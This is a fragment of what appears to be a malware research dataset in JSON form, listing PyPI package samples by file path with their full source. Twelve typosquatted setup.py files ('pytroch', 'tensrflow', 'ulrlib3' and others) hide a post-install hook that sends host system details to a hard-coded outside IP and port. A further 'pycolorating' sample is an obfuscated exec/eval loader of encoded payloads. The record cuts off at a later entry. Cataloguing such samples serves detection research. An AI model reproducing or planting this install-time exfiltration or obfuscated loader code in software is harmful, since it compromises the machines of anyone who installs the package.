        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-24-manda-cv-secureit",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='manda_cv_secureit',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-btoocore",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='btoocore',\n      version='99.9',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-typing-extnesions",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='typing-extnesions',\n      version='99.9',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-ulrlib3",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='ulrlib3',\n      version='99.9',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-oxeru3-test",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='oxeru3-test',\n      version='0.4',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-kers",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='kers',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-lightgmb",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='lightgmb',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-numoy",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='numoy',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-pytroch",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='pytroch',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-tensrflow",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='tensrflow',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-trejklfffffffffgdjg",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='trejklfffffffffgdjg',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-17-urllb",
        "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n      import platform\n      from datetime import datetime\n      import socket\n\n      with open(\"/proc/uptime\", \"r\") as f:\n            uptime = f.read().split(\" \")[0].strip()\n\n      uptime = int(float(uptime))\n      uptime_hours = uptime // 3600\n      uptime_minutes = (uptime % 3600) // 60\n      uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n      systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", socket.gethostbyname(socket.gethostname()))\n      sendable_string = f\"{uptime} --- {systeminfo}\"\n      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      clientSocket.connect((\"134.209.85.64\",9090))\n      clientSocket.send(str(sendable_string).encode())\n\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         install.run(self)\n         createfile()\n\nsetup(name='urllb',\n      version='0.6',\n      description='Security project for PoC.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      install_requires=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n"
      }
    ]
  },
  {
    "cluster_id": 37,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-pycolorating-v1.0.0",
        "code": "import random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(False)'],['''RM*}2ycHo>5NZ!~?gMLtsQO6XuArF?`w#(pg?WL**xVRVnetR`z%-#<I@&(3-|B#+b-jdv(PRGzSATTG5zw<~RC%|2@!k1TU#{@$9^O3t6yanT@gy&o#{>@I%qUEEXSW*Mg3E)o2~<$jnqruKZyK?PwLsY^)YF>+&65&6cB^h{Z89HXeO+E~AwDU}ViV>?Jdd%>pG&`2-#wT=tx<893QCyBcSm&_lm+&y|0j&6YOC|1D!YegsByq>GMb$@U(MoR`t$!buehFs782if2~ceKIoT%AO%$OQTEluTYm_S<SA;VErAz9Ip*lqu72Gjnjix@r`~m}qw?d#HBK)-~(+!JrPUzAF{NfEWil4^^nHjXoS7)1w@*^J)xhvQ|OG}GNH%nbqtjta*m(a$v3y%U^=4NY*#Tin1FK5a8Aq{+`cE~#VEFO@V#40Dl@TGap3{j2SrjgIInkCVGs?9WubRsF<2k3n)$0-U6_`|;eP(Z+AS3*vi;Bg9!gzK?!*>AkF3Q$F!Vjd5h?1V)aoXj#&>lgc7$aTMBrdA4c#jo36JO+NOo=-FKm*HgS&^s3;cq`OncTBUe{g5*V^*ph{UfG8ASh`l~*_hYUp?KLkgcqusYEG{N6SH1V4R%DY`^FW=6p(!`|4YkMPvZb+8De{@*6;6SF|mtw&!|yM8bkoi&RNLmF;s6vkZ+A&f(mi10q6GZn!-*oNLeFE5OI8<5p%U4D@k`gd?rU)z*HK{AE9c$5vFfC5D6wmvxtdO8(a-QUQF~QO=%|$)JazuKoPu^lFGGz3vdC8?#44?{Lun6Ga*y5P>)mitj#wMyb6XVp5;JJgkpQFMYHo{$nS)Jn5L3ab#4KDqJVMApeZ0O!S1E0SrQLEM>sXzgNtmbFk66S5BhWz1=iD?czs%04~WZV;{xwn(6|SnP_0D%s0X?V%Fa4uYeR1m(OIYajM-Bpcerue#OkSI<0Z7~a!PQrTcOqzr!kjRt~m=lz70e&VMHhAf{q)!jYYb%%_%dkex4mQG}2THxaDHBkGpMx3+mKvnK2z|{Nc@acA400$lyvsI&8*pw#LswX(%u1Yozb@<6~_C_eF5sHZAUMFz0%WI<DPJv~f`ETI?8W21u|auVkvX9iezIdn}NVYjZO*Jo9_W#2$~LZWE-#CHa)7ynMOmBIE?#YBeu4k-Cdc85}$WE8jaJ7k)c?>$;(jO@3Kq9=&NhxXHVx_(eIXdrBA1Tf25zrC6q1ybaIBKxKiMZregK7jJPdde(>93D}>Lucna{fhkl7D(Cvy;}z4enY?5VN;$J+#j~mj6MStLTHsefzqR<wuZX%8!4#QEYFN}iCqYF|UR)onu~qhyFd$X^Sh*grocctq;>y`Adr+lt$SbK6zdpL7ZMd<hq|(ztn-Q}HXA7OtTB^JpAk|hNrVVNH<2si^o7uO)NY)v5sx+rN0=&r87i5|*1KpMd!ta@OoSj<FQRK2_0Q|agjj~~TPn^s8peEv0uys;WYquL8nH;T2s5tVG%}+OD5#vJc;F|l;zODn;_C`GUiWHakDqOJyCYo`*Sr4!QOt)Hpk83-rBtd3P$zs=n*EMW|dhINEtReoeXN(sDZ$>N@?FBvFhfPP!xtQ2D{#dS+^M;#zRIY+%w|n1;LV-olR3cgoxUE)kt32F;=F@zJBnf5MWt*q+BrR_`6jFqj%rC^hN$Ej+4X4?GA1GsM0(g-H_o}-x6O=!i#F8xAUu|%@m6ToP$VD;om#k<yRZ97*uUG)B=lo1}k&^'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-04-pyfastcode-v1.0.0",
